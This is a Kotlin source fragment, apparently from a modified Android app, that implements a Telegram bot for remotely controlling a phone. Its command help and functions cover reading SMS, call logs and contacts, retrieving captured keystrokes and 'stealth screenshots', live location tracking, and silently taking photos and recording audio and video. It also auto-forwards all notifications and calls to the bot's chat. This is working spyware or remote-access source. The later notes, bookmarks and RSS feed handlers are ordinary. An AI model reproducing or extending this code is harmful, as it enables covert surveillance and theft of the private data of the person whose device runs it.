        val byGroup = all.groupBy { group(it) }
        byGroup.toSortedMap().forEach { (cat, perms) ->
            sb.append("<b>$cat</b>\n")
            perms.forEach { p ->
                val ok = try { p.can(ctx) } catch (_: Throwable) { false }
                val icon = if (ok) "✅" else "❌"
                sb.append("   $icon <code>${p.name}</code>\n")
            }
            sb.append("\n")
            if (sb.length > 3500) { sb.append("…"); return@forEach }
        }
        sb.append("🕐 ${ts}")
        sendMessage(sb.toString())
    }

    // ========== AUTOMATION ==========

    private fun cmdAutomations() {
        val ctx = MainApp.instance
        val enabled = AutomationHelper.isEnabled(ctx)
        val rules = AutomationHelper.list(ctx)
        val sb = StringBuilder()
        sb.append("⚙️ <b>Automation Rules</b>  ${if (enabled) "🟢 ENGINE ON" else "⚪ ENGINE OFF"}\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("📋 Total: <b>${rules.size}</b>\n\n")
        if (rules.isEmpty()) {
            sb.append("(no rules yet — create them in PlainApp → Device Hub → Automation)")
            sendMessage(sb.toString())
            return
        }
        rules.forEachIndexed { i, r ->
            val state = if (r.enabled) "🟢" else "⚪"
            val kind = if (r.kind == "schedule") "📅" else "🔀"
            sb.append("${i + 1}. $state $kind <b>${htmlEsc(r.name)}</b>\n")
            sb.append("   🎯 trigger: <code>${r.trigger.type}</code>\n")
            if (r.actions.isNotEmpty()) {
                val acts = r.actions.joinToString(", ") { it.type }
                sb.append("   ⚡ actions: <code>${htmlEsc(acts.take(80))}</code>\n")
            }
            if (r.lastRunMs > 0) sb.append("   🕐 last run: ${fmtTime(r.lastRunMs)}\n")
            sb.append("   🆔 <code>${r.id.take(8)}</code>\n\n")
            if (sb.length > 3500) { sb.append("…"); return@forEachIndexed }
        }
        sb.append("\n💡 /runrule &lt;id&gt; to run · /togglerule &lt;id&gt; to toggle")
        sendMessage(sb.toString())
    }

    private fun cmdRunRule(args: List<String>) {
        if (args.isEmpty()) { sendMessage("Usage: /runrule &lt;id&gt;\n\nFind IDs with /automations"); return }
        val idPrefix = args[0]
        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(idPrefix) }
        if (rule == null) { sendMessage("❌ No rule matches <code>${htmlEsc(idPrefix)}</code>"); return }
        try {
            val started = com.ismartcoding.plain.helpers.AutomationActionRunner.trigger(rule.id, "manual")
            if (started) sendMessage("▶️ Started <b>${htmlEsc(rule.name)}</b>")
            else sendMessage("⚠️ Rule did not run (disabled, cooldown, or conditions failed).")
        } catch (e: Throwable) {
            sendMessage("❌ Could not start rule: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdToggleRule(args: List<String>) {
        if (args.isEmpty()) { sendMessage("Usage: /togglerule &lt;id&gt;"); return }
        val idPrefix = args[0]
        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(idPrefix) }
        if (rule == null) { sendMessage("❌ No rule matches <code>${htmlEsc(idPrefix)}</code>"); return }
        val updated = rule.copy(enabled = !rule.enabled)
        AutomationHelper.upsert(updated)
        sendMessage("${if (updated.enabled) "🟢" else "⚪"} <b>${htmlEsc(rule.name)}</b> is now ${if (updated.enabled) "ON" else "OFF"}")
    }

    private fun cmdCommands() {
        val sb = StringBuilder("📝 <b>All Commands — Full Details</b>\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📱 <b>MESSAGING</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /messages [n] — List last N SMS conversations (default 10, max 50)\n")
        sb.append("• /sms &lt;thread_id&gt; — Read messages in a specific SMS thread\n")
        sb.append("• /sendsms &lt;number&gt; &lt;text&gt; — Send an SMS to any number\n")
        sb.append("• /calls [n] — View call log (default 20, max 100)\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("👥 <b>CONTACTS</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /contacts [name] — List all contacts or search by name\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("🔔 <b>NOTIFICATIONS & LOGS</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /notifications [n] — Recent notifications (default 15, max 50)\n")
        sb.append("• /logs [n] — Full notification log history (default 30, max 200)\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📁 <b>FILES</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /files — Browse /sdcard root\n")
        sb.append("• /files /path/to/dir — Browse specific directory\n")
        sb.append("• /files /path/to/file.ext — Show file info\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📸 <b>CAMERA & MEDIA</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /screenshot — Instant screenshot (needs Accessibility Service)\n")
        sb.append("• /photo — Instant back camera photo\n")
        sb.append("• /photo front — Instant front camera selfie\n")
        sb.append("• /audio 10 — Record 10 seconds of audio (1–300s)\n")
        sb.append("• /video 10 — Record 10s video with back camera (1–120s)\n")
        sb.append("• /video 10 front — Record 10s video with front camera\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📱 <b>APPS</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /apps — List all installed apps\n")
        sb.append("• /apps chrome — Search apps by name\n")
        sb.append("• /blockapp &lt;package&gt; — Block an app from launching\n")
        sb.append("• /unblockapp &lt;package&gt; — Remove app block\n")
        sb.append("• /blockedapps — List all blocked apps\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("📍 <b>LOCATION & DEVICE</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /location — Current GPS location + map pin\n")
        sb.append("• /battery — Battery level, charging state & temp\n")
        sb.append("• /device — Full device information\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("🛰 <b>TRACKING HUB</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /track — Overview of all tracking modules\n")
        sb.append("• /livelocation [n] — Stream status + latest fix + last N points (sends map pin)\n")
        sb.append("• /tracklocation [n] — Detailed list of last N points (1–100)\n")
        sb.append("• /keystrokes [n] — Last N captured keystrokes (1–50)\n")
        sb.append("• /keytop — Top apps by keystroke count (bar chart)\n")
        sb.append("• /shots [n] — Recent stealth screenshots + auto-send latest (1–30)\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("🛡 <b>PERMISSIONS</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /permissions — Live status of every Android permission\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("⚙️ <b>AUTOMATION</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /automations — List all automation rules with status\n")
        sb.append("• /runrule &lt;id&gt; — Run a rule manually (use first 8 chars)\n")
        sb.append("• /togglerule &lt;id&gt; — Enable/disable a rule\n\n")
        sb.append("═══════════════════════════\n")
        sb.append("⚙️ <b>BOT CONTROL</b>\n")
        sb.append("═══════════════════════════\n")
        sb.append("• /start — Show welcome message & status\n")
        sb.append("• /help — Quick command reference\n")
        sb.append("• /commands — This detailed help\n")
        sb.append("• /stop — Stop the bot\n\n")
        sb.append("🔄 <b>AUTO-FORWARDING (always on):</b>\n")
        sb.append("All new notifications, incoming/outgoing calls and missed calls are automatically forwarded to this chat in real-time.")
        sendMessage(sb.toString())
    }

    @SuppressLint("MissingPermission")
    private suspend fun capturePhoto(context: Context, useFront: Boolean): File? {
        return suspendCancellableCoroutine { cont ->
            val handlerThread = HandlerThread("TgCameraCapture").apply { start() }
            val handler = Handler(handlerThread.looper)
            var cameraDevice: CameraDevice? = null
            var imageReader: ImageReader? = null

            fun cleanup() {
                try { cameraDevice?.close() } catch (_: Throwable) {}
                try { imageReader?.close() } catch (_: Throwable) {}
                try { handlerThread.quitSafely() } catch (_: Throwable) {}
            }

            cont.invokeOnCancellation { cleanup() }

            try {
                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val facing = if (useFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
                val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                    cameraManager.getCameraCharacteristics(id)
                        .get(CameraCharacteristics.LENS_FACING) == facing
                } ?: cameraManager.cameraIdList.firstOrNull() ?: run {
                    cleanup()
                    if (cont.isActive) cont.resume(null)
                    return@suspendCancellableCoroutine
                }

                val file = File(context.cacheDir, "tg_photo_${System.currentTimeMillis()}.jpg")
                imageReader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 1)
                imageReader!!.setOnImageAvailableListener({ reader ->
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        try {
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            image.close()
                            file.writeBytes(bytes)
                            cleanup()
                            if (cont.isActive) cont.resume(if (file.length() > 0) file else null)
                        } catch (e: Exception) {
                            image.close()
                            cleanup()
                            if (cont.isActive) cont.resume(null)
                        }
                    }
                }, handler)

                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        try {
                            camera.createCaptureSession(
                                listOf(imageReader!!.surface),
                                object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                                        try {
                                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                                addTarget(imageReader!!.surface)
                                                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
                                            }
                                            session.capture(req.build(), null, handler)
                                        } catch (e: Exception) {
                                            cleanup()
                                            if (cont.isActive) cont.resume(null)
                                        }
                                    }
                                    override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) {
                                        cleanup()
                                        if (cont.isActive) cont.resume(null)
                                    }
                                }, handler
                            )
                        } catch (e: Exception) {
                            cleanup()
                            if (cont.isActive) cont.resume(null)
                        }
                    }
                    override fun onDisconnected(camera: CameraDevice) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                    override fun onError(camera: CameraDevice, error: Int) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                }, handler)
            } catch (e: Exception) {
                LogCat.e("TgCamera capturePhoto: ${e.message}")
                cleanup()
                if (cont.isActive) cont.resume(null)
            }
        }
    }

    private suspend fun recordAudio(context: Context, seconds: Int): File? {
        val file = File(context.cacheDir, "tg_audio_${System.currentTimeMillis()}.m4a")
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION") MediaRecorder()
        }
        return try {
            recorder.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            delay(seconds * 1000L)
            recorder.stop()
            recorder.release()
            if (file.exists() && file.length() > 0) file else null
        } catch (e: Exception) {
            LogCat.e("TgAudio recordAudio: ${e.message}")
            try { recorder.release() } catch (_: Throwable) {}
            null
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun recordVideo(context: Context, seconds: Int, useFront: Boolean): File? {
        val file = File(context.cacheDir, "tg_video_${System.currentTimeMillis()}.mp4")
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION") MediaRecorder()
        }
        return suspendCancellableCoroutine { cont ->
            val handlerThread = HandlerThread("TgVideoCapture").apply { start() }
            val handler = Handler(handlerThread.looper)
            var cameraDevice: CameraDevice? = null
            var surface: android.view.Surface? = null

            fun cleanup() {
                try { cameraDevice?.close() } catch (_: Throwable) {}
                try { recorder.release() } catch (_: Throwable) {}
                try { surface?.release() } catch (_: Throwable) {}
                try { handlerThread.quitSafely() } catch (_: Throwable) {}
            }

            cont.invokeOnCancellation { cleanup() }

            try {
                recorder.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setVideoSize(1280, 720)
                    setVideoFrameRate(30)
                    setOutputFile(file.absolutePath)
                    prepare()
                }
                surface = recorder.surface

                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val facing = if (useFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
                val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                    cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == facing
                } ?: cameraManager.cameraIdList.firstOrNull() ?: run {
                    cleanup()
                    if (cont.isActive) cont.resume(null)
                    return@suspendCancellableCoroutine
                }

                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        try {
                            camera.createCaptureSession(
                                listOf(surface!!),
                                object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                                        try {
                                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                                                addTarget(surface!!)
                                                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                            }
                                            session.setRepeatingRequest(req.build(), null, handler)
                                            recorder.start()
                                            handler.postDelayed({
                                                try {
                                                    recorder.stop()
                                                } catch (_: Throwable) {}
                                                cleanup()
                                                if (cont.isActive) cont.resume(if (file.exists() && file.length() > 0) file else null)
                                            }, seconds * 1000L)
                                        } catch (e: Exception) {
                                            cleanup()
                                            if (cont.isActive) cont.resume(null)
                                        }
                                    }
                                    override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) {
                                        cleanup()
                                        if (cont.isActive) cont.resume(null)
                                    }
                                }, handler
                            )
                        } catch (e: Exception) {
                            cleanup()
                            if (cont.isActive) cont.resume(null)
                        }
                    }
                    override fun onDisconnected(camera: CameraDevice) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                    override fun onError(camera: CameraDevice, error: Int) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                }, handler)
            } catch (e: Exception) {
                LogCat.e("TgVideo recordVideo: ${e.message}")
                cleanup()
                if (cont.isActive) cont.resume(null)
            }
        }
    }

    private fun htmlEsc(s: String?): String {
        if (s.isNullOrEmpty()) return ""
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    }

    private fun fmtTime(epochMs: Long): String =
        SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(epochMs))

    private fun fileIcon(name: String): String {
        val ext = name.substringAfterLast('.', "").lowercase()
        return when (ext) {
            "jpg", "jpeg", "png", "gif", "webp", "bmp" -> "🖼"
            "mp4", "mkv", "avi", "mov", "webm" -> "🎬"
            "mp3", "aac", "ogg", "wav", "flac", "m4a" -> "🎵"
            "pdf" -> "📄"
            "doc", "docx" -> "📝"
            "xls", "xlsx" -> "📊"
            "ppt", "pptx" -> "📋"
            "zip", "rar", "7z", "tar", "gz" -> "📦"
            "apk" -> "📲"
            "txt", "log" -> "📃"
            else -> "📄"
        }
    }

    // ========================================================================
    // ====================  WEB-PANEL PARITY EXTENSIONS  =====================
    // ========================================================================

    /** Sanitize a string so it can be safely used as a callback_data segment (no ':'). */
    private fun safeSeg(s: String): String = s.replace(':', '_').replace(' ', '_')

    /** Stable short token for package names (some are >55 chars, plus we keep callback_data tidy). */
    private val pkgTokens = java.util.concurrent.ConcurrentHashMap<String, String>()
    private fun pkgToken(pkg: String): String {
        val md = java.security.MessageDigest.getInstance("MD5")
        val hex = md.digest(pkg.toByteArray()).joinToString("") { "%02x".format(it) }.take(12)
        pkgTokens[hex] = pkg
        return hex
    }
    private fun pkgFromToken(t: String): String? = pkgTokens[t]

    // ---------------- Notes ----------------

    @Volatile private var lastNotesQuery: String = ""
    @Volatile private var lastNotesOffset: Int = 0

    private suspend fun cmdNotes(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderNotesPage(q, 0, editMessageId = null)
    }

    private suspend fun renderNotesPage(query: String, offset: Int, editMessageId: Long?) {
        lastNotesQuery = query
        lastNotesOffset = offset
        try {
            val pageSize = 10
            val items = NoteHelper.search(query, pageSize + 1, offset)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📝 No notes found.\n\nUse /addnote to create one." else "📝 No more notes."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val sb = StringBuilder("📝 <b>Notes</b> · ${offset + 1}–${offset + pageItems.size}\n")
            sb.append("<i>Tap a note to view, or send /addnote to create one.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, n ->
                val title = n.title.ifBlank { n.getSummary().take(40).ifBlank { "(untitled)" } }
                val short = n.getSummary().take(80)
                sb.append("${offset + i + 1}. 📝 <b>${htmlEsc(title)}</b>\n")
                if (short.isNotBlank() && short != title) sb.append("   <i>${htmlEsc(short)}</i>\n")
                sb.append("   🕐 ${fmtTime(n.updatedAt.toEpochMilliseconds())}\n\n")
                rows.add(listOf("${offset + i + 1}. ${title.take(30)}" to "note_view:${n.id}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "notes_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "notes_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("➕ New note" to "note_view:__new__"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read notes: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun renderNoteDetail(id: String, editMessageId: Long?) {
        if (id == "__new__") { cmdAddNote(); return }
        val n = NoteHelper.getById(id)
        if (n == null) {
            val msg = "❌ Note not found."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        val title = n.title.ifBlank { "(untitled)" }
        val sb = StringBuilder()
        sb.append("📝 <b>${htmlEsc(title)}</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("🕐 ${fmtTime(n.updatedAt.toEpochMilliseconds())}\n\n")
        sb.append("<pre>${htmlEsc(n.content.take(3500))}</pre>")
        if (n.content.length > 3500) sb.append("\n<i>… truncated (${n.content.length} chars total)</i>")
        val rows = listOf(
            listOf("🗑 Trash" to "note_del:${n.id}", "⬅️ Back" to "note_back"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun cmdAddNote() {
        pendingInput = "note_create"
        sendMessage("➕ <b>New note</b>\n\nReply with the note content.\n• If you include a line break, the <b>first line is the title</b>, the rest is the body.\n• If single line, it becomes both title and body.\n\nSend any /command to cancel.")
    }

    // ---------------- Bookmarks ----------------

    @Volatile private var lastBookmarksQuery: String = ""
    @Volatile private var lastBookmarksOffset: Int = 0

    private suspend fun cmdBookmarks(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) args.joinToString(" ").lowercase() else ""
        renderBookmarksPage(q, 0, editMessageId = null)
    }

    private suspend fun renderBookmarksPage(query: String, offset: Int, editMessageId: Long?) {
        lastBookmarksQuery = query
        lastBookmarksOffset = offset
        try {
            val all = BookmarkHelper.getAll()
            val filtered = if (query.isBlank()) all else all.filter {
                it.title.lowercase().contains(query) || it.url.lowercase().contains(query)
            }
            val pageSize = 10
            val total = filtered.size
            val pageItems = filtered.drop(offset).take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "🔖 No bookmarks found.\n\nUse /addbookmark &lt;url&gt; to add one." else "🔖 No more bookmarks."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val sb = StringBuilder("🔖 <b>Bookmarks</b> · ${offset + 1}–${offset + pageItems.size} of $total\n")
            sb.append("<i>Tap to open on device or manage.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, b ->
                val title = b.title.ifBlank { b.url }
                val pin = if (b.pinned) "📌 " else ""
                sb.append("${offset + i + 1}. ${pin}🔗 <b>${htmlEsc(title.take(80))}</b>\n")
                sb.append("   <code>${htmlEsc(b.url.take(80))}</code>\n")
                if (b.clickCount > 0) sb.append("   👁 ${b.clickCount} opens\n")
                sb.append("\n")
                rows.add(listOf("${offset + i + 1}. ${title.take(30)}" to "bm_view:${b.id}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "bm_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (offset + pageSize < total) nav.add("Next ▶️" to "bm_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read bookmarks: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun renderBookmarkDetail(id: String, editMessageId: Long?) {
        val b = BookmarkHelper.getById(id)
        if (b == null) {
            val msg = "❌ Bookmark not found."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        val sb = StringBuilder()
        sb.append("🔖 <b>${htmlEsc(b.title.ifBlank { b.url })}</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("🔗 <code>${htmlEsc(b.url)}</code>\n\n")
        if (b.pinned) sb.append("📌 Pinned\n")
        if (b.clickCount > 0) sb.append("👁 Opened ${b.clickCount} times\n")
        sb.append("🕐 Added ${fmtTime(b.createdAt.toEpochMilliseconds())}\n")
        val rows = listOf(
            listOf("🌐 Open on device" to "bm_open:${b.id}"),
            listOf("🗑 Delete" to "bm_del:${b.id}", "⬅️ Back" to "bm_back"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun cmdAddBookmark(args: List<String>) {
        if (args.isEmpty()) {
            pendingInput = "bookmark_url"
            sendMessage("➕ <b>Add bookmark</b>\n\nReply with the full URL (must start with <code>http://</code> or <code>https://</code>).\nSend any /command to cancel.")
            return
        }
        val url = args.joinToString(" ").trim()
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            sendMessage("❌ URL must start with <code>http://</code> or <code>https://</code>")
            return
        }
        try {
            val list = BookmarkHelper.addBookmarks(listOf(url))
            val b = list.firstOrNull()
            if (b != null) {
                sendMessage("✅ Bookmark added: <code>${htmlEsc(url)}</code>\n<i>Title/favicon will fetch in background.</i>")
                scope.launch { try { BookmarkHelper.fetchMetadataAsync(MainApp.instance, listOf(b.id)) } catch (_: Throwable) {} }
            }
        } catch (e: Exception) {
            sendMessage("❌ Could not add bookmark: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ---------------- Feeds ----------------

    private suspend fun cmdFeeds() {
        sendTyping()
        renderFeedsList(editMessageId = null)
    }

    private suspend fun renderFeedsList(editMessageId: Long?) {
        try {
            val feeds = FeedHelper.getAll()
            if (feeds.isEmpty()) {
                val msg = "📡 No RSS feeds added.\n\nReply with a feed URL to add one (use the link below)."
                val rows = listOf(listOf("➕ Add feed URL" to "fe_view:__add__"))
                val markup = TelegramApiClient.inlineKeyboard(rows)
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg, replyMarkup = markup)
                else sendMessage(msg, replyMarkup = markup)
                return
            }
            val counts = try { FeedHelper.getFeedCounts().associate { it.id to it.count } } catch (_: Throwable) { emptyMap() }
            val sb = StringBuilder("📡 <b>RSS Feeds</b> (${feeds.size})\n<i>Tap a feed to view recent entries.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            feeds.forEachIndexed { i, f ->
                val n = counts[f.id] ?: 0
                sb.append("${i + 1}. 📡 <b>${htmlEsc(f.name.ifBlank { f.url })}</b>  ·  $n entries\n")
                sb.append("   <code>${htmlEsc(f.url.take(70))}</code>\n\n")
                rows.add(listOf("${i + 1}. ${f.name.ifBlank { f.url }.take(28)}" to "feed_view:${f.id}"))
            }
            rows.add(listOf("📰 All recent entries" to "fe_view:__all__"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not load feeds: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdFeedEntries(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderFeedEntriesPage("", 0, editMessageId = null, baseQuery = q)
    }

    private suspend fun renderFeedEntriesPage(feedId: String, offset: Int, editMessageId: Long?, baseQuery: String = "") {
        if (feedId == "__add__") {
            pendingInput = "feed_url"
            val msg = "➕ <b>Add RSS feed</b>\n\nReply with the feed URL (http/https). It must be a valid RSS or Atom feed.\nSend any /command to cancel."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        try {
            val q = when {
                feedId == "__all__" || feedId.isBlank() -> baseQuery
                else -> {
                    val extra = "feed_id:$feedId"
                    if (baseQuery.isBlank()) extra else "$extra $baseQuery"
                }
            }
            val pageSize = 10
            val items = FeedEntryHelper.search(q, pageSize + 1, offset)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            val feedName = if (feedId.isNotBlank() && feedId != "__all__") {
                FeedHelper.getById(feedId)?.name ?: "feed"
            } else "All feeds"
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📰 No entries in <b>${htmlEsc(feedName)}</b>." else "📰 No more entries."
                val markup = TelegramApiClient.inlineKeyboard(listOf(listOf("⬅️ Back to feeds" to "feeds_back")))
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg, replyMarkup = markup)
                else sendMessage(msg, replyMarkup = markup)
                return
            }
            val sb = StringBuilder("📰 <b>${htmlEsc(feedName)}</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap an entry to read.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, e ->
                val mark = if (e.read) "✓" else "🔵"
                sb.append("${offset + i + 1}. $mark <b>${htmlEsc(e.title.take(80))}</b>\n")
                sb.append("   🕐 ${fmtTime(e.publishedAt.toEpochMilliseconds())}\n")
                if (e.author.isNotBlank()) sb.append("   ✍ ${htmlEsc(e.author.take(40))}\n")
                sb.append("\n")
                rows.add(listOf("${offset + i + 1}. ${e.title.take(30)}" to "fe_view:${e.id}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val fid = feedId.ifBlank { "_" }
            if (offset > 0) nav.add("◀️ Prev" to "fe_pg:$fid:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "fe_pg:$fid:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("⬅️ Back to feeds" to "feeds_back"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not load entries: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun renderFeedEntryDetail(id: String, editMessageId: Long?) {
        if (id == "__add__") {
            pendingInput = "feed_url"
            val msg = "➕ <b>Add RSS feed</b>\n\nReply with the feed URL (http/https).\nSend any /command to cancel."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        if (id == "__all__") { renderFeedEntriesPage("__all__", 0, editMessageId); return }
        val e = FeedEntryHelper.getAsync(id)
        if (e == null) {
            val msg = "❌ Entry not found."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        // Mark as read
        try { FeedEntryHelper.updateAsync(id) { read = true } } catch (_: Throwable) {}
        val sb = StringBuilder()
        sb.append("📰 <b>${htmlEsc(e.title)}</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━━\n")
